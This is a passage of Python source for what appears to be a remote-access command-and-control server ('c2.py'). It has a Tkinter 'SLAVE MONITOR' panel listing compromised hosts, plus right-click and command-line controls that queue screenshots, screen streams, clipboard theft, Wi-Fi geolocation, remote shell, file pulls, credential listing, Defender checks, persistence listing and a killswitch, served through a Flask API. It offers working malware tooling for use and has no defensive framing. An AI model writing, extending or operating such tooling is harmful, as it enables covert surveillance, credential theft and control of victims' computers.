    ONLINE = "#4ec9b0"; OFFLINE = "#f44747"; BORDER = "#3c3c3c"

    image_label = None
    fullscreen_window = None

    tk.Label(root, text="SLAVE MONITOR", bg=BG, fg=TEXT_COLOR,
             font=("Segoe UI", 12, "bold")).pack(pady=(10, 5))

    main_paned = ttk.PanedWindow(root, orient=tk.HORIZONTAL)
    main_paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 5))

    left_frame = tk.Frame(main_paned, bg=FRAME_BG, highlightbackground=BORDER, highlightthickness=1, width=340)
    left_frame.pack_propagate(False)
    main_paned.add(left_frame, weight=0)

    listbox_frame = tk.Frame(left_frame, bg=FRAME_BG)
    listbox_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    scrollbar_y = tk.Scrollbar(listbox_frame, bg=BG); scrollbar_y.pack(side=tk.RIGHT, fill=tk.Y)
    scrollbar_x = tk.Scrollbar(listbox_frame, orient=tk.HORIZONTAL, bg=BG); scrollbar_x.pack(side=tk.BOTTOM, fill=tk.X)

    listbox = tk.Listbox(listbox_frame, bg=FRAME_BG, fg=TEXT_COLOR,
                         selectbackground="#3c3c3c", selectforeground=TEXT_COLOR,
                         font=("Consolas", 9), bd=0, highlightthickness=0,
                         yscrollcommand=scrollbar_y.set, xscrollcommand=scrollbar_x.set,
                         activestyle="none")
    listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
    scrollbar_y.config(command=listbox.yview)
    scrollbar_x.config(command=listbox.xview)

    right_frame = tk.Frame(main_paned, bg=FRAME_BG, highlightbackground=BORDER, highlightthickness=1)
    main_paned.add(right_frame, weight=1)

    info_frame = tk.Frame(right_frame, bg=FRAME_BG)
    info_frame.pack(fill=tk.BOTH, expand=True)

    info_labels = {}
    info_data = [
        ("ID",          "numeric_id"),
        ("Hostname",    "hostname"),
        ("IP",          "public_ip"),
        ("OS",          "os"),
        ("Kernel",      "kernel"),
        ("Domain",      "domain"),
        ("Admin",       "is_admin"),
        ("Tunnel",      "tunnel"),
        ("Last Cmd",    "last_cmd"),
        ("Notes",       "notes"),
        ("Last Seen",   "last_seen"),
        ("Status",      "status"),
    ]
    for i, (label_text, _) in enumerate(info_data):
        tk.Label(info_frame, text=f"{label_text}:", bg=FRAME_BG, fg=DIM_TEXT,
                 font=("Segoe UI", 9, "bold"), anchor="e").grid(row=i, column=0, sticky="e", padx=(10, 5), pady=3)
        val = tk.Label(info_frame, text="-", bg=FRAME_BG, fg=TEXT_COLOR,
                       font=("Consolas", 9), anchor="w", wraplength=500, justify="left")
        val.grid(row=i, column=1, sticky="w", padx=(0, 10), pady=3)
        info_labels[info_data[i][1]] = val

    ttk.Separator(info_frame, orient='horizontal').grid(row=len(info_data), column=0, columnspan=2, sticky="ew", pady=8)
    status_indicator = tk.Canvas(info_frame, width=20, height=20, bg=FRAME_BG, highlightthickness=0)
    status_indicator.grid(row=len(info_data)+1, column=0, columnspan=2, pady=6)
    circle = status_indicator.create_oval(2, 2, 18, 18, fill=OFFLINE, outline="")

    image_frame = tk.Frame(right_frame, bg=FRAME_BG)
    image_label = tk.Label(image_frame, bg=FRAME_BG, relief=tk.FLAT)

    def update_info_pane(data):
        for key, label in info_labels.items():
            label.config(text=data.get(key, "-"))
        is_online = False
        last_seen = data.get("last_seen")
        if last_seen:
            try:
                dt = datetime.datetime.fromisoformat(str(last_seen).replace('Z', '+00:00'))
                if (datetime.datetime.now(datetime.timezone.utc) - dt).total_seconds() < 30:
                    is_online = True
            except Exception:
                pass
        info_labels["status"].config(text="Online" if is_online else "Offline")
        status_indicator.itemconfig(circle, fill=ONLINE if is_online else OFFLINE)

    def show_image(img_data):
        if not img_data:
            return
        try:
            pil_img = Image.open(BytesIO(img_data))
            right_frame.update_idletasks()
            w, h = right_frame.winfo_width(), right_frame.winfo_height()
            if w > 10 and h > 10:
                pil_img.thumbnail((w, h), Image.LANCZOS)
            photo = ImageTk.PhotoImage(pil_img)
            image_label.config(image=photo)
            image_label.image = photo
            image_label.img_data = img_data
            # Only re-layout on transition, otherwise stream frames flicker
            if not image_frame.winfo_ismapped():
                info_frame.pack_forget()
                image_frame.pack(fill=tk.BOTH, expand=True)
                image_label.pack(fill=tk.BOTH, expand=True)
        except Exception as e:
            log_queue.put(f"[!] image display: {e}")

    def hide_image():
        if image_frame.winfo_ismapped():
            image_frame.pack_forget()
            info_frame.pack(fill=tk.BOTH, expand=True)

    def on_left_click(event):
        try:
            sel = listbox.curselection()
            if not sel:
                return
            idx = sel[0]
            line = listbox.get(idx)
            num_id = int(line.split("ID:")[1].split("|")[0].strip())
            conn = db_conn(); c = conn.cursor()
            c.execute("""SELECT numeric_id, hostname, public_ip, os, kernel, last_seen, status,
                domain, is_admin, tunnel_kind, tunnel_port, last_cmd, notes
                FROM slaves WHERE numeric_id = ?""", (num_id,))
            row = c.fetchone(); conn.close()
            if not row:
                return
            tunnel = "-"
            if row[9]:
                tunnel = f"{row[9]} (port {row[10] or '?'})"
            data = {
                "numeric_id": f"{row[0]:04d}",
                "hostname":   row[1] or "-",
                "public_ip":  row[2] or "-",
                "os":         row[3] or "-",
                "kernel":     row[4] or "-",
                "domain":     row[7] or "-",
                "is_admin":   "yes" if row[8] else "no",
                "tunnel":     tunnel,
                "last_cmd":   row[11] or "-",
                "notes":      row[12] or "",
                "last_seen":  row[5],
                "status":     row[6],
            }
            update_info_pane(data)
            hide_image()
        except Exception:
            pass

    def push_console(*lines):
        for ln in lines:
            console_input_queue.put(ln + "\n")

    def edit_notes(num_id):
        conn = db_conn(); c = conn.cursor()
        c.execute("SELECT notes FROM slaves WHERE numeric_id = ?", (num_id,))
        r = c.fetchone(); conn.close()
        current = r[0] if r else ""
        new = simpledialog.askstring("Notes", f"Notes for {num_id:04d}:", initialvalue=current or "")
        if new is not None:
            conn = db_conn(); c = conn.cursor()
            c.execute("UPDATE slaves SET notes = ? WHERE numeric_id = ?", (new, num_id))
            conn.commit(); conn.close()
            snapshot_slave_to_ids(num_id)

    def on_right_click(event):
        try:
            idx = listbox.nearest(event.y)
            listbox.selection_clear(0, tk.END)
            listbox.selection_set(idx)
            line = listbox.get(idx)
            num_id = int(line.split("ID:")[1].split("|")[0].strip())

            m = tk.Menu(root, tearoff=0, bg=FRAME_BG, fg=TEXT_COLOR,
                        activebackground="#3c3c3c", activeforeground=TEXT_COLOR)
            m.add_command(label=f"ID {num_id:04d}", state="disabled")
            m.add_separator()
            def copy_id():
                root.clipboard_clear(); root.clipboard_append(f"{num_id:04d}")
                status_bar.config(text=f"Copied ID: {num_id:04d}", fg=ONLINE)
                root.after(2000, lambda: status_bar.config(text="Ready", fg=DIM_TEXT))
            m.add_command(label="Copy ID", command=copy_id)
            m.add_command(label="Notes...", command=lambda: edit_notes(num_id))
            m.add_separator()
            m.add_command(label="Queue: Screenshot",  command=lambda: queue_command(num_id, "SCREEN_CAPTURE"))
            m.add_command(label="Queue: Status",      command=lambda: queue_command(num_id, "STATUS"))
            m.add_command(label="Queue: Sysinfo",     command=lambda: queue_command(num_id, "SYSINFO"))
            m.add_command(label="Queue: Clipboard",   command=lambda: queue_command(num_id, "CLIPBOARD_GET"))
            m.add_command(label="Queue: Wi-Fi scan",  command=lambda: queue_command(num_id, "TRIANGULATE"))
            m.add_separator()
            m.add_command(label="Enter: Shell",   command=lambda: push_console("exit", f"{num_id} enter shell"))
            m.add_command(label="Enter: Collect", command=lambda: push_console("exit", f"{num_id} enter collect"))
            m.add_command(label="Enter: Recon",   command=lambda: push_console("exit", f"{num_id} enter recon"))
            m.add_separator()
            m.add_command(label="Killswitch", command=lambda: queue_command(num_id, "KILLSWITCH"))
            m.post(event.x_root, event.y_root)
        except Exception:
            pass

    listbox.bind("<<ListboxSelect>>", on_left_click)
    listbox.bind("<Button-3>", on_right_click)

    def on_image_double_click(event):
        nonlocal fullscreen_window
        if fullscreen_window is not None and fullscreen_window.winfo_exists():
            fullscreen_window.destroy()
        fullscreen_window = tk.Toplevel(root)
        fullscreen_window.title("Screen Capture")
        fullscreen_window.attributes('-fullscreen', True)
        fullscreen_window.configure(bg='black')
        if hasattr(image_label, 'img_data'):
            pil_img = Image.open(BytesIO(image_label.img_data))
            sw, sh = fullscreen_window.winfo_screenwidth(), fullscreen_window.winfo_screenheight()
            pil_img.thumbnail((sw, sh), Image.LANCZOS)
            photo = ImageTk.PhotoImage(pil_img)
            lbl = tk.Label(fullscreen_window, image=photo, bg='black')
            lbl.image = photo
            lbl.pack(expand=True)
            lbl.bind('<Button-1>', lambda e: fullscreen_window.destroy())
            fullscreen_window.bind('<Escape>', lambda e: fullscreen_window.destroy())
        else:
            fullscreen_window.destroy()

    image_label.bind('<Double-Button-1>', on_image_double_click)

    bottom_container = tk.Frame(root, bg=BG)
    bottom_container.pack(fill=tk.X, padx=10, pady=(0, 10))

    def build_log_panel(parent, label_text):
        frame = tk.Frame(parent, bg=FRAME_BG, highlightbackground=BORDER, highlightthickness=1)
        frame.pack(fill=tk.X, pady=(0, 2))
        toggle = tk.Frame(frame, bg=FRAME_BG, cursor="hand2")
        toggle.pack(fill=tk.X, padx=5, pady=5)
        arrow = tk.Label(toggle, text="v", bg=FRAME_BG, fg=TEXT_COLOR, font=("Segoe UI", 10, "bold"))
        arrow.pack(side=tk.LEFT, padx=(0, 5))
        lbl = tk.Label(toggle, text=label_text, bg=FRAME_BG, fg=DIM_TEXT, font=("Segoe UI", 10))
        lbl.pack(side=tk.LEFT)
        cont = tk.Frame(frame, bg=FRAME_BG)
        txt = tk.Text(cont, bg="#1e1e1e", fg=TEXT_COLOR, font=("Consolas", 9),
                      wrap=tk.WORD, height=6, relief=tk.FLAT, bd=0, highlightthickness=0)
        scr = tk.Scrollbar(cont, command=txt.yview, bg=BG)
        txt.config(yscrollcommand=scr.set)
        txt.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        scr.pack(side=tk.RIGHT, fill=tk.Y, pady=5)
        cont.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        state = {'visible': True}
        def toggle_fn(_=None):
            if state['visible']:
                cont.pack_forget(); arrow.config(text=">"); state['visible'] = False
            else:
                cont.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
                arrow.config(text="v"); state['visible'] = True
        for w in (toggle, arrow, lbl):
            w.bind("<Button-1>", toggle_fn)
        return txt

    ddos_like_text = build_log_panel(bottom_container, "Session Logs")
    cmd_log_text   = build_log_panel(bottom_container, "Command Pool")

    status_bar = tk.Label(root, text="Ready", bg=BG, fg=DIM_TEXT, font=("Segoe UI", 9), anchor="w")
    status_bar.pack(fill=tk.X, padx=10, pady=(0, 10))

    def update_grid():
        listbox.delete(0, tk.END)
        try:
            conn = db_conn(); c = conn.cursor()
            c.execute("""SELECT numeric_id, hostname, last_seen, tunnel_kind, is_admin
                FROM slaves ORDER BY numeric_id""")
            rows = c.fetchall(); conn.close()
        except Exception:
            rows = []
        for num_id, hostname, last_seen, tunnel_kind, is_admin in rows:
            online = False
            if last_seen:
                try:
                    dt = datetime.datetime.fromisoformat(str(last_seen).replace('Z', '+00:00'))
                    if (datetime.datetime.now(datetime.timezone.utc) - dt).total_seconds() < 30:
                        online = True
                except Exception:
                    pass
            icon = "*"
            tstr = f" [{tunnel_kind}]" if tunnel_kind else ""
            astr = " [ADMIN]" if is_admin else ""
            display = f"{icon} ID: {num_id:04d} | {hostname}{astr}{tstr}"
            listbox.insert(tk.END, display)
            listbox.itemconfig(tk.END, {'fg': ONLINE if online else OFFLINE})
        root.after(2000, update_grid)

    def process_queues():
        try:
            while True:
                msg = log_queue.get_nowait()
                if isinstance(msg, logging.LogRecord):
                    ts = datetime.datetime.fromtimestamp(msg.created).strftime('%H:%M:%S')
                    msg = f"[{ts}] {msg.levelname}: {msg.getMessage()}"
                elif not isinstance(msg, str):
                    msg = str(msg)
                cmd_log_text.insert(tk.END, msg + "\n"); cmd_log_text.see(tk.END)
        except queue.Empty:
            pass
        try:
            while True:
                msg = session_log_queue.get_nowait()
                if not isinstance(msg, str):
                    msg = str(msg)
                ddos_like_text.insert(tk.END, msg + "\n"); ddos_like_text.see(tk.END)
        except queue.Empty:
            pass
        # Drain image queue to only show latest frame (streams produce many)
        try:
            latest = None
            while True:
                try:
                    latest = image_queue.get_nowait()
                except queue.Empty:
                    break
            if latest:
                show_image(latest[1])
        except Exception:
            pass
        root.after(100, process_queues)

    update_grid()
    process_queues()
    root.mainloop()

# ---------------------------------------------------------------------------
# CLI MODE
# ---------------------------------------------------------------------------
def client_mode():
    if len(sys.argv) < 3:
        print("  Usage: python3 c2.py <id> <command> [args]")
        print("  Example: python3 c2.py 0001 status")
        print("  Example: python3 c2.py 0001 shell whoami")
        sys.exit(1)

    raw_id = sys.argv[1]
    if not raw_id.isdigit():
        print("  ID must be numeric."); sys.exit(1)
    numeric_id = int(raw_id)
    command = sys.argv[2].upper()
    payload = None
    if len(sys.argv) > 3:
        payload_str = " ".join(sys.argv[3:])
        if command == "SHELL":
            payload = {"cmd": payload_str}

    headers = {}
    token = os.environ.get('C2_TOKEN')
    if token:
        headers['X-C2-Token'] = token

    try:
        requests.get(f"{SERVER_URL}/api/v1/image/0", timeout=1, headers=headers)
    except requests.exceptions.ConnectionError:
        print("  C2 server not running.")
        sys.exit(1)

    conn = db_conn(); c = conn.cursor()
    c.execute("SELECT 1 FROM slaves WHERE numeric_id = ?", (numeric_id,))
    if not c.fetchone():
        print(f"  Slave ID {numeric_id:04d} not found.")
        conn.close(); sys.exit(1)
    conn.close()

    allowed = {"STATUS", "SYSINFO", "SHELL", "SCREEN_CAPTURE", "TRIANGULATE",
               "CLIPBOARD_GET", "PROCESSES", "NETWORK_INFO", "DNS_CACHE",
               "DEFENDER_CHECK", "PERSIST_LIST", "TASK_CLEANUP", "KILLSWITCH",
               "FILE_PULL", "CRED_LIST",
               "SCREEN_STREAM_START", "SCREEN_STREAM_STOP"}
    if command not in allowed:
        print(f"  '{command}' not supported from CLI.")
        sys.exit(1)

    tid = queue_command(numeric_id, command, payload)
    if tid:
        print(f"  '{command}' queued for ID {numeric_id:04d} (task {tid})")

# ---------------------------------------------------------------------------
# RUNNERS
# ---------------------------------------------------------------------------
def run_flask():
    cli = sys.modules.get('flask.cli')
    if cli:
        cli.show_server_banner = lambda *args: None
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)

def stdin_reader():
    try:
        for line in sys.stdin:
            console_input_queue.put(line)
    except Exception:
        pass
    console_input_queue.put(None)

if __name__ == '__main__':
    init_db()
    migrate_ids_file()

    if len(sys.argv) > 1:
        client_mode()
        sys.exit(0)

    for logger_name in ['', 'werkzeug', 'flask']:
        logger = logging.getLogger(logger_name)
        logger.handlers = []
        logger.setLevel(logging.INFO)
        logger.addHandler(QueueHandler(log_queue))

    sys.stderr = open(os.devnull, 'w')

    threading.Thread(target=run_flask, daemon=True).start()
    time.sleep(1)

    threading.Thread(target=stdin_reader, daemon=True).start()
    threading.Thread(target=layer_0, daemon=True).start()

    try:
        run_gui()
    except KeyboardInterrupt:
        print("\n  Goodbye.\n")
        sys.exit(0)